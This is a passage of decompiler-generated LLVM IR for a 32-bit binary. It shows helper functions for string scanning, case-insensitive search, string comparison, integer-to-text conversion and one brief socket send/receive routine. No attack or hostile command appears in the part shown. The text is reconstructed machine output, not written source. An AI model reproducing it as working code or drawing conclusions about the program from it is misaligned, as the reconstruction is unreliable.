  %v1_8051e8d = load i32, i32* %esi.global-to-local, align 4
  %v3_8051e8d = add i32 %v1_8051e8d, %v0_8051e94.pre
  %v4_8051e8d = inttoptr i32 %v3_8051e8d to i8*
  %v5_8051e8d = load i8, i8* %v4_8051e8d, align 1
  %v14_8051e8d = icmp eq i8 %v5_8051e8d, 10
  %v1_8051e92 = icmp eq i1 %v14_8051e8d, false
  br i1 %v1_8051e92, label %dec_label_pc_8051e8d.dec_label_pc_8051e75_crit_edge, label %dec_label_pc_8051e94

dec_label_pc_8051e8d.dec_label_pc_8051e75_crit_edge: ; preds = %dec_label_pc_8051e8d
  %v0_8051e7c.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8051e75

dec_label_pc_8051e94:                             ; preds = %dec_label_pc_8051e75, %dec_label_pc_8051e88, %dec_label_pc_8051e8d
  %v0_8051e94 = phi i32 [ %v1_8051e88, %dec_label_pc_8051e88 ], [ %v1_8051e88, %dec_label_pc_8051e8d ], [ %v0_8051e94.pre, %dec_label_pc_8051e75 ]
  %v1_8051e94 = icmp eq i32 %v0_8051e94, 0
  %v1_8051e96 = icmp eq i1 %v1_8051e94, false
  %v0_8051ea3 = load i32, i32* %esi.global-to-local, align 4
  %v2_8051ea3 = select i1 %v1_8051e96, i32 %v0_8051ea3, i32 0
  store i32 %v0_8051e63, i32* @ebx, align 4
  store i32 %v0_8051e61, i32* @edi, align 4
  ret i32 %v2_8051ea3

; uselistorder directives
  uselistorder i32 %v1_8051e88, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_8051e94.pre, { 1, 0, 2 }
  uselistorder i32 %v1_8051e85, { 1, 0 }
  uselistorder i32 (i32, i32*, i32, i32)* @function_805237c, { 1, 0 }
  uselistorder label %dec_label_pc_8051e94, { 2, 1, 0 }
}

define i32 @function_8051eb0() local_unnamed_addr {
dec_label_pc_8051eb0:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  store i32 16, i32* %stack_var_-12, align 4
  %v1_8051ebd = call i32 @function_8052719(i32 16)
  %v1_8051ec2 = inttoptr i32 %v1_8051ebd to i32*
  store i32 0, i32* %v1_8051ec2, align 4
  %v3_8051ecf = call i32 @function_80529d5(i32 2, i32 2, i32 0)
  store i32 %v3_8051ecf, i32* %esi.global-to-local, align 4
  %v10_8051edb = icmp eq i32 %v3_8051ecf, -1
  br i1 %v10_8051edb, label %dec_label_pc_8051f22, label %dec_label_pc_8051ee0

dec_label_pc_8051ee0:                             ; preds = %dec_label_pc_8051eb0
  %v2_8051ee0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8051ee0, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-28, align 4
  %v3_8051eff = call i32 @function_80527fa(i32 %v3_8051ecf, i32 %v2_8051ee0, i32 16)
  %v2_8051f07 = ptrtoint i32* %stack_var_-12 to i32
  %v0_8051f0d = load i32, i32* %esi.global-to-local, align 4
  %v3_8051f0e = call i32 @function_8052825(i32 %v0_8051f0d, i32 %v2_8051ee0, i32 %v2_8051f07)
  %v1_8051f16 = call i32 @function_80521e1(i32 %v0_8051f0d)
  br label %dec_label_pc_8051f22

dec_label_pc_8051f22:                             ; preds = %dec_label_pc_8051eb0, %dec_label_pc_8051ee0
  %v0_8051f27 = phi i32 [ 0, %dec_label_pc_8051eb0 ], [ 134744072, %dec_label_pc_8051ee0 ]
  ret i32 %v0_8051f27

; uselistorder directives
  uselistorder i32 %v3_8051ecf, { 1, 0, 2 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_80527fa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_80529d5, { 7, 6, 5, 4, 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_8051f22, { 1, 0 }
}

define i32 @function_8051f30(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051f30:
  %tmp18 = inttoptr i32 %arg3 to i8*
  %v2_8051f42 = load i8, i8* %tmp18, align 1
  %v3_8051f42 = icmp eq i8 %v2_8051f42, 0
  br i1 %v3_8051f42, label %dec_label_pc_8051f58, label %dec_label_pc_8051f48

dec_label_pc_8051f48:                             ; preds = %dec_label_pc_8051f30, %dec_label_pc_8051f48
  %v2_8051f48 = phi i32 [ %v1_8051f4b, %dec_label_pc_8051f48 ], [ 0, %dec_label_pc_8051f30 ]
  %v1_8051f4b = add i32 %v2_8051f48, 1
  %v2_8051f52 = add i32 %v1_8051f4b, %arg3
  %v3_8051f52 = inttoptr i32 %v2_8051f52 to i8*
  %v4_8051f52 = load i8, i8* %v3_8051f52, align 1
  %v5_8051f52 = icmp eq i8 %v4_8051f52, 0
  %v1_8051f56 = icmp eq i1 %v5_8051f52, false
  br i1 %v1_8051f56, label %dec_label_pc_8051f48, label %dec_label_pc_8051f58

dec_label_pc_8051f58:                             ; preds = %dec_label_pc_8051f48, %dec_label_pc_8051f30
  %v2_8051f8f = phi i32 [ 0, %dec_label_pc_8051f30 ], [ %v1_8051f4b, %dec_label_pc_8051f48 ]
  %v4_8051f5e = ptrtoint i8* %arg1 to i32
  %tmp25 = icmp slt i32 %arg2, 1
  br i1 %tmp25, label %dec_label_pc_8051f8c, label %dec_label_pc_8051f66.preheader

dec_label_pc_8051f66.preheader:                   ; preds = %dec_label_pc_8051f58
  %v4_8051f66.pre = load i32, i32* @ecx, align 4
  %v6_8051f68.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8051f66

dec_label_pc_8051f66:                             ; preds = %dec_label_pc_8051f66.preheader, %dec_label_pc_8051f87
  %v0_8051f87 = phi i32 [ %arg2, %dec_label_pc_8051f66.preheader ], [ %v1_8051f87, %dec_label_pc_8051f87 ]
  %v6_8051f68 = phi i32 [ %v6_8051f68.pre, %dec_label_pc_8051f66.preheader ], [ %v2_8051f81, %dec_label_pc_8051f87 ]
  %v0_8051f95 = phi i32 [ 0, %dec_label_pc_8051f66.preheader ], [ %v1_8051f688, %dec_label_pc_8051f87 ]
  %v4_8051f66 = phi i32 [ %v4_8051f66.pre, %dec_label_pc_8051f66.preheader ], [ %v0_8051f81, %dec_label_pc_8051f87 ]
  %v0_8051f6c = phi i32 [ %v4_8051f5e, %dec_label_pc_8051f66.preheader ], [ %v1_8051f6c, %dec_label_pc_8051f87 ]
  %v1_8051f66 = inttoptr i32 %v0_8051f6c to i8*
  %v2_8051f66 = load i8, i8* %v1_8051f66, align 1
  %v3_8051f66 = zext i8 %v2_8051f66 to i32
  %v5_8051f66 = and i32 %v4_8051f66, -256
  %v6_8051f66 = or i32 %v3_8051f66, %v5_8051f66
  store i32 %v6_8051f66, i32* @ecx, align 4
  %v2_8051f68 = add i32 %v0_8051f95, %arg3
  %v3_8051f68 = inttoptr i32 %v2_8051f68 to i8*
  %v4_8051f68 = load i8, i8* %v3_8051f68, align 1
  %v5_8051f68 = zext i8 %v4_8051f68 to i32
  %v7_8051f68 = and i32 %v6_8051f68, -256
  %v8_8051f68 = or i32 %v5_8051f68, %v7_8051f68
  %v1_8051f6c = add i32 %v0_8051f6c, 1
  %v1_8051f6d = add i8 %v2_8051f66, -65
  %v8_8051f72 = icmp ugt i8 %v1_8051f6d, 25
  br i1 %v8_8051f72, label %dec_label_pc_8051f77, label %dec_label_pc_8051f74

dec_label_pc_8051f74:                             ; preds = %dec_label_pc_8051f66
  %v1_8051f74 = or i32 %v6_8051f66, 96
  store i32 %v1_8051f74, i32* @ecx, align 4
  br label %dec_label_pc_8051f77

dec_label_pc_8051f77:                             ; preds = %dec_label_pc_8051f66, %dec_label_pc_8051f74
  %v0_8051f81 = phi i32 [ %v6_8051f66, %dec_label_pc_8051f66 ], [ %v1_8051f74, %dec_label_pc_8051f74 ]
  %v1_8051f77 = add i8 %v4_8051f68, -65
  %v8_8051f7c = icmp ugt i8 %v1_8051f77, 25
  br i1 %v8_8051f7c, label %dec_label_pc_8051f81, label %dec_label_pc_8051f7e

dec_label_pc_8051f7e:                             ; preds = %dec_label_pc_8051f77
  %v1_8051f7e = or i32 %v8_8051f68, 96
  br label %dec_label_pc_8051f81

dec_label_pc_8051f81:                             ; preds = %dec_label_pc_8051f77, %dec_label_pc_8051f7e
  %v2_8051f81 = phi i32 [ %v8_8051f68, %dec_label_pc_8051f77 ], [ %v1_8051f7e, %dec_label_pc_8051f7e ]
  %v1_8051f81 = trunc i32 %v0_8051f81 to i8
  %v3_8051f81 = trunc i32 %v2_8051f81 to i8
  %v15_8051f81 = icmp eq i8 %v1_8051f81, %v3_8051f81
  br i1 %v15_8051f81, label %dec_label_pc_8051f95, label %dec_label_pc_8051f85

dec_label_pc_8051f85:                             ; preds = %dec_label_pc_8051f81
  br label %dec_label_pc_8051f87

dec_label_pc_8051f87:                             ; preds = %dec_label_pc_8051f95, %dec_label_pc_8051f85
  %v1_8051f688 = phi i32 [ %v1_8051f95, %dec_label_pc_8051f95 ], [ 0, %dec_label_pc_8051f85 ]
  %v1_8051f87 = add i32 %v0_8051f87, -1
  %tmp26 = icmp slt i32 %v1_8051f87, 1
  %tmp27 = icmp eq i1 %tmp26, false
  br i1 %tmp27, label %dec_label_pc_8051f66, label %dec_label_pc_8051f8c

dec_label_pc_8051f8c:                             ; preds = %dec_label_pc_8051f87, %dec_label_pc_8051f58
  store i32 %v2_8051f8f, i32* @edx, align 4
  ret i32 -1

dec_label_pc_8051f95:                             ; preds = %dec_label_pc_8051f81
  %v1_8051f95 = add i32 %v0_8051f95, 1
  %v14_8051f96 = icmp eq i32 %v2_8051f8f, %v1_8051f95
  %v1_8051f99 = icmp eq i1 %v14_8051f96, false
  br i1 %v1_8051f99, label %dec_label_pc_8051f87, label %dec_label_pc_8051f9b

dec_label_pc_8051f9b:                             ; preds = %dec_label_pc_8051f95
  store i32 %v4_8051f5e, i32* @ecx, align 4
  %v2_8051fa1 = sub i32 %v1_8051f6c, %v4_8051f5e
  store i32 %v2_8051f8f, i32* @edx, align 4
  ret i32 %v2_8051fa1

; uselistorder directives
  uselistorder i32 %v1_8051f87, { 1, 0 }
  uselistorder i32 %v0_8051f95, { 1, 0 }
  uselistorder i32 %v4_8051f5e, { 2, 1, 0 }
  uselistorder i32 %v2_8051f8f, { 2, 0, 1 }
  uselistorder i8 25, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8051f81, { 1, 0 }
  uselistorder label %dec_label_pc_8051f77, { 1, 0 }
  uselistorder label %dec_label_pc_8051f66, { 1, 0 }
  uselistorder label %dec_label_pc_8051f48, { 1, 0 }
}

define i32 @function_8051fb0() local_unnamed_addr {
dec_label_pc_8051fb0:
  %tmp = call i8* @__decompiler_undefined_function_2()
  %tmp13 = call i8* @__decompiler_undefined_function_2()
  %v4_8051fb2 = ptrtoint i8* %tmp13 to i32
  %v4_8051fb8 = ptrtoint i8* %tmp to i32
  %v2_8051fbc = load i8, i8* %tmp13, align 1
  %v3_8051fbc = icmp eq i8 %v2_8051fbc, 0
  br i1 %v3_8051fbc, label %dec_label_pc_8051fc8, label %dec_label_pc_8051fc1

dec_label_pc_8051fc1:                             ; preds = %dec_label_pc_8051fb0, %dec_label_pc_8051fc1
  %v0_8051fc1 = phi i32 [ %v1_8051fc1, %dec_label_pc_8051fc1 ], [ 0, %dec_label_pc_8051fb0 ]
  %v1_8051fc1 = add i32 %v0_8051fc1, 1
  %v2_8051fc2 = add i32 %v1_8051fc1, %v4_8051fb2
  %v3_8051fc2 = inttoptr i32 %v2_8051fc2 to i8*
  %v4_8051fc2 = load i8, i8* %v3_8051fc2, align 1
  %v5_8051fc2 = icmp eq i8 %v4_8051fc2, 0
  %v1_8051fc6 = icmp eq i1 %v5_8051fc2, false
  br i1 %v1_8051fc6, label %dec_label_pc_8051fc1, label %dec_label_pc_8051fc8

dec_label_pc_8051fc8:                             ; preds = %dec_label_pc_8051fc1, %dec_label_pc_8051fb0
  %v0_8051fd9 = phi i32 [ 0, %dec_label_pc_8051fb0 ], [ %v1_8051fc1, %dec_label_pc_8051fc1 ]
  %v2_8051fca = load i8, i8* %tmp, align 1
  %v3_8051fca = icmp eq i8 %v2_8051fca, 0
  br i1 %v3_8051fca, label %dec_label_pc_8051fd7, label %dec_label_pc_8051fd0

dec_label_pc_8051fd0:                             ; preds = %dec_label_pc_8051fc8, %dec_label_pc_8051fd0
  %v0_8051fd0 = phi i32 [ %v1_8051fd0, %dec_label_pc_8051fd0 ], [ 0, %dec_label_pc_8051fc8 ]
  %v1_8051fd0 = add i32 %v0_8051fd0, 1
  %v2_8051fd1 = add i32 %v1_8051fd0, %v4_8051fb8
  %v3_8051fd1 = inttoptr i32 %v2_8051fd1 to i8*
  %v4_8051fd1 = load i8, i8* %v3_8051fd1, align 1
  %v5_8051fd1 = icmp eq i8 %v4_8051fd1, 0
  %v1_8051fd5 = icmp eq i1 %v5_8051fd1, false
  br i1 %v1_8051fd5, label %dec_label_pc_8051fd0, label %dec_label_pc_8051fd7

dec_label_pc_8051fd7:                             ; preds = %dec_label_pc_8051fd0, %dec_label_pc_8051fc8
  %v0_8051fd7 = phi i32 [ 0, %dec_label_pc_8051fc8 ], [ %v1_8051fd0, %dec_label_pc_8051fd0 ]
  store i32 %v0_8051fd7, i32* @edx, align 4
  %v12_8051fd9 = icmp eq i32 %v0_8051fd9, %v0_8051fd7
  br i1 %v12_8051fd9, label %dec_label_pc_8051fe4.preheader, label %dec_label_pc_8051fdd

dec_label_pc_8051fe4.preheader:                   ; preds = %dec_label_pc_8051fd7
  %v1_8051fe417 = add i32 %v0_8051fd9, -1
  store i32 %v1_8051fe417, i32* @edx, align 4
  %v10_8051fe518 = icmp eq i32 %v0_8051fd9, 0
  br i1 %v10_8051fe518, label %dec_label_pc_8051ff2, label %dec_label_pc_8051fea

dec_label_pc_8051fdd:                             ; preds = %dec_label_pc_8051fea, %dec_label_pc_8051fd7
  ret i32 0

dec_label_pc_8051fe2:                             ; preds = %dec_label_pc_8051fea
  %v3_8051fea = zext i8 %v2_8051fea to i32
  %v5_8051fea = and i32 %v4_8051fea20, -256
  %v6_8051fea = or i32 %v3_8051fea, %v5_8051fea
  %v1_8051fe2 = add i32 %v0_8051fe221, 1
  %v1_8051fe3 = add i32 %v0_8051fe319, 1
  %v1_8051fe4 = add i32 %v1_8051fe422, -1
  store i32 %v1_8051fe4, i32* @edx, align 4
  %v10_8051fe5 = icmp eq i32 %v1_8051fe422, 0
  br i1 %v10_8051fe5, label %dec_label_pc_8051ff2, label %dec_label_pc_8051fea

dec_label_pc_8051fea:                             ; preds = %dec_label_pc_8051fe4.preheader, %dec_label_pc_8051fe2
  %v1_8051fe422 = phi i32 [ %v1_8051fe4, %dec_label_pc_8051fe2 ], [ %v1_8051fe417, %dec_label_pc_8051fe4.preheader ]
  %v0_8051fe221 = phi i32 [ %v1_8051fe2, %dec_label_pc_8051fe2 ], [ %v4_8051fb2, %dec_label_pc_8051fe4.preheader ]
  %v4_8051fea20 = phi i32 [ %v6_8051fea, %dec_label_pc_8051fe2 ], [ %v0_8051fd9, %dec_label_pc_8051fe4.preheader ]
  %v0_8051fe319 = phi i32 [ %v1_8051fe3, %dec_label_pc_8051fe2 ], [ %v4_8051fb8, %dec_label_pc_8051fe4.preheader ]
  %v1_8051fea = inttoptr i32 %v0_8051fe221 to i8*
  %v2_8051fea = load i8, i8* %v1_8051fea, align 1
  %v3_8051fec = inttoptr i32 %v0_8051fe319 to i8*
  %v4_8051fec = load i8, i8* %v3_8051fec, align 1
  %v15_8051fec = icmp eq i8 %v2_8051fea, %v4_8051fec
  br i1 %v15_8051fec, label %dec_label_pc_8051fe2, label %dec_label_pc_8051fdd

dec_label_pc_8051ff2:                             ; preds = %dec_label_pc_8051fe2, %dec_label_pc_8051fe4.preheader
  ret i32 1

; uselistorder directives
  uselistorder i32 %v1_8051fe422, { 1, 0 }
  uselistorder i32 %v0_8051fd9, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8051fea, { 1, 0 }
  uselistorder label %dec_label_pc_8051fd0, { 1, 0 }
  uselistorder label %dec_label_pc_8051fc1, { 1, 0 }
}

define i32 @function_8052000() local_unnamed_addr {
dec_label_pc_8052000:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp13 = call i8* @__decompiler_undefined_function_2()
  %tmp14 = call i8* @__decompiler_undefined_function_2()
  %v4_8052002 = ptrtoint i8* %tmp14 to i32
  %v4_8052008 = ptrtoint i8* %tmp13 to i32
  %v2_8052010 = load i8, i8* %tmp14, align 1
  %v3_8052010 = icmp eq i8 %v2_8052010, 0
  br i1 %v3_8052010, label %dec_label_pc_805201c, label %dec_label_pc_8052015

dec_label_pc_8052015:                             ; preds = %dec_label_pc_8052000, %dec_label_pc_8052015
  %v0_8052015 = phi i32 [ %v1_8052015, %dec_label_pc_8052015 ], [ 0, %dec_label_pc_8052000 ]
  %v1_8052015 = add i32 %v0_8052015, 1
  %v2_8052016 = add i32 %v1_8052015, %v4_8052002
  %v3_8052016 = inttoptr i32 %v2_8052016 to i8*
  %v4_8052016 = load i8, i8* %v3_8052016, align 1
  %v5_8052016 = icmp eq i8 %v4_8052016, 0
  %v1_805201a = icmp eq i1 %v5_8052016, false
  br i1 %v1_805201a, label %dec_label_pc_8052015, label %dec_label_pc_805201c

dec_label_pc_805201c:                             ; preds = %dec_label_pc_8052015, %dec_label_pc_8052000
  %v1_805202a = phi i32 [ 0, %dec_label_pc_8052000 ], [ %v1_8052015, %dec_label_pc_8052015 ]
  %v2_805201e = load i8, i8* %tmp13, align 1
  %v3_805201e = icmp eq i8 %v2_805201e, 0
  br i1 %v3_805201e, label %dec_label_pc_805202a, label %dec_label_pc_8052023

dec_label_pc_8052023:                             ; preds = %dec_label_pc_805201c, %dec_label_pc_8052023
  %v0_8052023 = phi i32 [ %v1_8052023, %dec_label_pc_8052023 ], [ 0, %dec_label_pc_805201c ]
  %v1_8052023 = add i32 %v0_8052023, 1
  %v2_8052024 = add i32 %v1_8052023, %v4_8052008
  %v3_8052024 = inttoptr i32 %v2_8052024 to i8*
  %v4_8052024 = load i8, i8* %v3_8052024, align 1
  %v5_8052024 = icmp eq i8 %v4_8052024, 0
  %v1_8052028 = icmp eq i1 %v5_8052024, false
  br i1 %v1_8052028, label %dec_label_pc_8052023, label %dec_label_pc_805202a

dec_label_pc_805202a:                             ; preds = %dec_label_pc_8052023, %dec_label_pc_805201c
  %v1_805202e = phi i32 [ 0, %dec_label_pc_805201c ], [ %v1_8052023, %dec_label_pc_8052023 ]
  %v8_805202c = icmp sgt i32 %tmp, %v1_805202a
  br i1 %v8_805202c, label %dec_label_pc_8052032, label %dec_label_pc_805202e

dec_label_pc_805202e:                             ; preds = %dec_label_pc_805202a
  %v7_8052030 = icmp sgt i32 %tmp, %v1_805202e
  br i1 %v7_8052030, label %dec_label_pc_8052032, label %dec_label_pc_8052039.preheader

dec_label_pc_8052039.preheader:                   ; preds = %dec_label_pc_805202e
  %v10_805203a19 = icmp eq i32 %tmp, 0
  br i1 %v10_805203a19, label %dec_label_pc_8052034, label %dec_label_pc_805203f

dec_label_pc_8052032:                             ; preds = %dec_label_pc_805203f, %dec_label_pc_805202e, %dec_label_pc_805202a
  br label %dec_label_pc_8052034

dec_label_pc_8052034:                             ; preds = %dec_label_pc_8052039.preheader, %dec_label_pc_8052037, %dec_label_pc_8052032
  %storemerge = phi i32 [ 0, %dec_label_pc_8052032 ], [ 1, %dec_label_pc_8052037 ], [ 1, %dec_label_pc_8052039.preheader ]
  ret i32 %storemerge

dec_label_pc_8052037:                             ; preds = %dec_label_pc_805203f
  %v3_805203f = zext i8 %v2_805203f to i32
  %v5_805203f = and i32 %v4_805203f21, -256
  %v6_805203f = or i32 %v3_805203f, %v5_805203f
  %v1_8052037 = add i32 %v0_805203722, 1
  %v1_8052038 = add i32 %v0_805203820, 1
  %v10_805203a = icmp eq i32 %v1_805203923, 0
  br i1 %v10_805203a, label %dec_label_pc_8052034, label %dec_label_pc_805203f

dec_label_pc_805203f:                             ; preds = %dec_label_pc_8052039.preheader, %dec_label_pc_8052037
  %v1_805203923.in = phi i32 [ %v1_805203923, %dec_label_pc_8052037 ], [ %tmp, %dec_label_pc_8052039.preheader ]
  %v0_805203722 = phi i32 [ %v1_8052037, %dec_label_pc_8052037 ], [ %v4_8052002, %dec_label_pc_8052039.preheader ]
  %v4_805203f21 = phi i32 [ %v6_805203f, %dec_label_pc_8052037 ], [ %v1_805202e, %dec_label_pc_8052039.preheader ]
  %v0_805203820 = phi i32 [ %v1_8052038, %dec_label_pc_8052037 ], [ %v4_8052008, %dec_label_pc_8052039.preheader ]
  %v1_805203923 = add i32 %v1_805203923.in, -1
  %v1_805203f = inttoptr i32 %v0_805203722 to i8*
  %v2_805203f = load i8, i8* %v1_805203f, align 1
  %v3_8052041 = inttoptr i32 %v0_805203820 to i8*
  %v4_8052041 = load i8, i8* %v3_8052041, align 1
  %v15_8052041 = icmp eq i8 %v2_805203f, %v4_8052041
  br i1 %v15_8052041, label %dec_label_pc_8052037, label %dec_label_pc_8052032

; uselistorder directives
  uselistorder label %dec_label_pc_805203f, { 1, 0 }
  uselistorder label %dec_label_pc_8052034, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8052023, { 1, 0 }
  uselistorder label %dec_label_pc_8052015, { 1, 0 }
}

define i32 @function_8052050(i64 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8052050:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp25 = inttoptr i32 %arg3 to i8*
  %stack_var_-64 = alloca i32, align 4
  %v12_8052054 = ptrtoint i32* %stack_var_-64 to i32
  %v4_805205b = trunc i64 %arg1 to i32
  store i32 %v4_805205b, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v2_8052063 = icmp eq i32 %arg3, 0
  br i1 %v2_8052063, label %dec_label_pc_80520d0, label %dec_label_pc_8052067

dec_label_pc_8052067:                             ; preds = %dec_label_pc_8052050
  %v2_8052067 = icmp eq i32 %v4_805205b, 0
  %v3_8052067 = icmp slt i32 %v4_805205b, 0
  br i1 %v2_8052067, label %dec_label_pc_80520e0, label %dec_label_pc_805206b

dec_label_pc_805206b:                             ; preds = %dec_label_pc_8052067
  %v9_8052070 = icmp eq i32 %arg2, 10
  br i1 %v9_8052070, label %dec_label_pc_80520fd, label %dec_label_pc_8052079

dec_label_pc_8052079:                             ; preds = %dec_label_pc_80520fd, %dec_label_pc_805206b
  br label %dec_label_pc_805207d

dec_label_pc_805207d:                             ; preds = %dec_label_pc_8052105, %dec_label_pc_8052079
  %storemerge35 = phi i32 [ %v4_805205b, %dec_label_pc_8052079 ], [ %v1_8052107, %dec_label_pc_8052105 ]
  %v0_80520845 = phi i32 [ %v4_805205b, %dec_label_pc_8052079 ], [ %v1_8052107, %dec_label_pc_8052105 ]
  %storemerge = phi i32 [ 0, %dec_label_pc_8052079 ], [ 1, %dec_label_pc_8052105 ]
  store i32 %storemerge35, i32* %ecx.global-to-local, align 4
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  store i32 32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052082

dec_label_pc_8052082:                             ; preds = %dec_label_pc_8052082.dec_label_pc_8052082_crit_edge, %dec_label_pc_805207d
  %v2_8052093 = phi i32 [ %v2_8052093.pre, %dec_label_pc_8052082.dec_label_pc_8052082_crit_edge ], [ %v12_8052054, %dec_label_pc_805207d ]
  %v3_8052093 = phi i32 [ %v1_805209b, %dec_label_pc_8052082.dec_label_pc_8052082_crit_edge ], [ 32, %dec_label_pc_805207d ]
  %v0_8052086 = phi i32 [ %v0_805209c, %dec_label_pc_8052082.dec_label_pc_8052082_crit_edge ], [ %arg2, %dec_label_pc_805207d ]
  %v0_8052084 = phi i32 [ %div20, %dec_label_pc_8052082.dec_label_pc_8052082_crit_edge ], [ %v0_80520845, %dec_label_pc_805207d ]
  %tmp32 = urem i32 %v0_8052084, %v0_8052086
  %v7_805208e = icmp sgt i32 %tmp32, 9
  %v1_8052090.v1_805208b.v = select i1 %v7_805208e, i32 55, i32 48
  %v1_8052090.v1_805208b = add i32 %v1_8052090.v1_805208b.v, %tmp32
  %v1_8052093 = trunc i32 %v1_8052090.v1_805208b to i8
  %v4_8052093 = add i32 %v3_8052093, 14
  %v5_8052093 = add i32 %v4_8052093, %v2_8052093
  %v6_8052093 = inttoptr i32 %v5_8052093 to i8*
  store i8 %v1_8052093, i8* %v6_8052093, align 1
  %v0_8052099 = load i32, i32* %ecx.global-to-local, align 4
  %v0_805209b = load i32, i32* %ebx.global-to-local, align 4
  %v1_805209b = add i32 %v0_805209b, -1
  store i32 %v1_805209b, i32* %ebx.global-to-local, align 4
  %v0_805209c = load i32, i32* %esi.global-to-local, align 4
  %div20 = udiv i32 %v0_8052099, %v0_805209c
  store i32 %div20, i32* %eax.global-to-local, align 4
  %tmp33 = urem i32 %v0_8052099, %v0_805209c
  store i32 %tmp33, i32* %edx.global-to-local, align 4
  store i32 %div20, i32* %ecx.global-to-local, align 4
  %v1_80520a0 = icmp ugt i32 %v0_805209c, %v0_8052099
  %v1_80520a2 = icmp eq i1 %v1_80520a0, false
  br i1 %v1_80520a2, label %dec_label_pc_8052082.dec_label_pc_8052082_crit_edge, label %dec_label_pc_80520a4

dec_label_pc_8052082.dec_label_pc_8052082_crit_edge: ; preds = %dec_label_pc_8052082
  %v2_8052093.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052082

dec_label_pc_80520a4:                             ; preds = %dec_label_pc_8052082
  %v0_80520a4 = load i32, i32* %ebp.global-to-local, align 4
  %v1_80520a4 = icmp eq i32 %v0_80520a4, 0
  %v1_80520a6 = icmp eq i1 %v1_80520a4, false
  br i1 %v1_80520a6, label %dec_label_pc_80520f6, label %dec_label_pc_80520a8

dec_label_pc_80520a8:                             ; preds = %dec_label_pc_80520a4
  store i32 %v0_805209b, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80520a9

dec_label_pc_80520a9:                             ; preds = %dec_label_pc_80520f6, %dec_label_pc_80520a8
  %v1_80520a9 = phi i32 [ %v1_80520a9.pre, %dec_label_pc_80520f6 ], [ %v0_805209b, %dec_label_pc_80520a8 ]
  %v0_80520a9 = load i32, i32* @esp, align 4
  %v2_80520a9 = add i32 %v1_80520a9, 14
  %v3_80520a9 = add i32 %v2_80520a9, %v0_80520a9
  store i32 %v3_80520a9, i32* %eax.global-to-local, align 4
  %v1_80520ad = inttoptr i32 %v3_80520a9 to i8*
  %v2_80520ad = load i8, i8* %v1_80520ad, align 1
  %v3_80520ad = icmp eq i8 %v2_80520ad, 0
  br i1 %v3_80520ad, label %dec_label_pc_8052115, label %dec_label_pc_80520b2

dec_label_pc_80520b2:                             ; preds = %dec_label_pc_80520a9
  store i32 0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80520b4

dec_label_pc_80520b4:                             ; preds = %dec_label_pc_80520b4, %dec_label_pc_80520b2
  %v0_80520b4 = phi i32 [ %v1_80520b4, %dec_label_pc_80520b4 ], [ 0, %dec_label_pc_80520b2 ]
  %v1_80520b4 = add i32 %v0_80520b4, 1
  store i32 %v1_80520b4, i32* %ecx.global-to-local, align 4
  %v2_80520b5 = add i32 %v1_80520b4, %v3_80520a9
  %v3_80520b5 = inttoptr i32 %v2_80520b5 to i8*
  %v4_80520b5 = load i8, i8* %v3_80520b5, align 1
  %v5_80520b5 = icmp eq i8 %v4_80520b5, 0
  %v1_80520b9 = icmp eq i1 %v5_80520b5, false
  br i1 %v1_80520b9, label %dec_label_pc_80520b4, label %dec_label_pc_80520bb

dec_label_pc_80520bb:                             ; preds = %dec_label_pc_80520b4
  %v10_80520bb = icmp eq i32 %v0_80520b4, -2
  br i1 %v10_80520bb, label %dec_label_pc_80520d0, label %dec_label_pc_80520c0

dec_label_pc_80520c0:                             ; preds = %dec_label_pc_80520bb
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  store i32 %v3_80520a9, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80520c4

dec_label_pc_80520c4:                             ; preds = %dec_label_pc_8052115, %dec_label_pc_80520c0, %dec_label_pc_80520c4.dec_label_pc_80520c4_crit_edge
  %v2_80520c7 = phi i32 [ %v1_80520ca, %dec_label_pc_80520c4.dec_label_pc_80520c4_crit_edge ], [ %arg3, %dec_label_pc_80520c0 ], [ %arg3, %dec_label_pc_8052115 ]
  %v0_80520c6 = phi i32 [ %v0_80520cb, %dec_label_pc_80520c4.dec_label_pc_80520c4_crit_edge ], [ %v1_80520b4, %dec_label_pc_80520c0 ], [ 0, %dec_label_pc_8052115 ]
  %v4_80520c4 = phi i32 [ %v4_80520c4.pre, %dec_label_pc_80520c4.dec_label_pc_80520c4_crit_edge ], [ %v3_80520a9, %dec_label_pc_80520c0 ], [ %v3_80520a9, %dec_label_pc_8052115 ]
  %v0_80520c4 = phi i32 [ %v1_80520c9, %dec_label_pc_80520c4.dec_label_pc_80520c4_crit_edge ], [ %v3_80520a9, %dec_label_pc_80520c0 ], [ %v3_80520a9, %dec_label_pc_8052115 ]
  %v1_80520c4 = inttoptr i32 %v0_80520c4 to i8*
  %v2_80520c4 = load i8, i8* %v1_80520c4, align 1
  %v3_80520c4 = zext i8 %v2_80520c4 to i32
  %v5_80520c4 = and i32 %v4_80520c4, -256
  %v6_80520c4 = or i32 %v3_80520c4, %v5_80520c4
  store i32 %v6_80520c4, i32* %eax.global-to-local, align 4
